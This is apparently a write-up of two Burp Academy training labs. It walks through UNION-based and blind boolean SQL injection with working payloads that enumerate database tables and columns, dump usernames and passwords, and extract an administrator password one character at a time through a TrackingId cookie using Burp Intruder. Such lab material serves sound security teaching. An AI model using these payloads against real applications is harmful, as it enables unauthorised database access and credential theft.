---
description: A walkthrough of one of the Burp Academy Labs
---

# SQLi Walkthrough

## SQL UNION SELECT

When we enter the room are presented with a web page:

![](../.gitbook/assets/image%20%2823%29.png)

### Injection Point

From here we search for our parameter that is injectable, clicking on one of the product categories we find an injection point:

![&quot;category=gifts&quot; is our injection point](../.gitbook/assets/image%20%2821%29.png)

### Counting Columns

First we need to craft a statement that will identify how many columns are in the table:

```text
' ORDER BY 1,2--
```

![](../.gitbook/assets/image%20%288%29.png)

The page loads with 2, and errors at 3, so there are 2 columns we have discovered. we can double check this with the following:

```text
' UNION SELECT NULL,NULL--
```

![](../.gitbook/assets/image%20%2830%29.png)

### Strings?

Next we have to discover if any of these columns can take a string value, we can add 'a' in place of the null to test this:

![](../.gitbook/assets/image%20%2811%29.png)

![](../.gitbook/assets/image%20%2827%29.png)

### Find Table Names

Next we should discover which tables are located within the database.

```text
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

![](../.gitbook/assets/image%20%2817%29.png)

From the list displayed we can find any interesting tables:

![](../.gitbook/assets/image%20%2825%29.png)

### Find Column Names

We now need to discover which columns are within this table, using the following:

```text
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_uiykfb'--
```

![](../.gitbook/assets/image%20%2822%29.png)

### Sweet Sweet Data

Now we have the column names we can get the data!

```text
' UNION SELECT username_kwdcsh,password_possgi FROM users_uiykfb--
```

![](../.gitbook/assets/image%20%2812%29.png)

## Blind SQL - Conditional Responses

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`

![](../.gitbook/assets/image%20%2829%29.png)

### Find True

Modify the `TrackingId` cookie, changing it to: `TrackingId=xyz' AND '1'='1`. Verify that the "Welcome back" message appears in the response. 

![](../.gitbook/assets/image%20%285%29.png)

![Welcome Back appears](../.gitbook/assets/image%20%286%29.png)

### Find False

Now change it to: `TrackingId=xyz' AND '1'='2` Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

![](../.gitbook/assets/image%20%2813%29.png)

![](../.gitbook/assets/image%20%2832%29.png)

### Check Table Exists

Now change it to: `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` Verify that the condition is true \(welcome back message should appear\), confirming that there is a table called users. 

![](../.gitbook/assets/image%20%289%29.png)

### Check User Exists

Now change it to: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` Verify that the condition is true, confirming that there is a user called administrator. 

![](../.gitbook/assets/image%20%2814%29.png)

### Find length of password

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`. This condition should be true, confirming that the password is greater than 1 character in length. 

![](../.gitbook/assets/image%20%2819%29.png)

Send a series of follow-up values to test different password lengths. Send: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`. Then send: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`. And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true \(i.e. when the "Welcome back" message disappears\), you have determined the length of the password.

![](../.gitbook/assets/image%20%2826%29.png)

![](../.gitbook/assets/image%20%287%29.png)

### Determine character in each position.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

 In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button. 

In the Positions tab, change the value of the cookie to: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a.` This uses the SUBSTRING\(\) function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value \(note the payload position markers\): TrackingId=xyz' AND \(SELECT SUBSTRING\(password,1,1\) FROM users WHERE username='administrator'\)='§a§ 

![](../.gitbook/assets/image%20%2818%29.png)

To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. . Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. 

![](../.gitbook/assets/image%20%2824%29.png)

To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".

![](../.gitbook/assets/image%20%2816%29.png)

 Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu. 

Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.

![](../.gitbook/assets/image%20%2820%29.png)

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value: TrackingId=xyz' AND \(SELECT SUBSTRING\(password,2,1\) FROM users WHERE username='administrator'\)='a

Launch the modified attack, review the results, and note the character at the second offset. 

Continue this process testing offset 3, 4, and so on, until you have the whole password. 

It is possible to use 2 payloads and a cluster bomb attack to test all combinations at once.

![](../.gitbook/assets/image%20%2831%29.png)

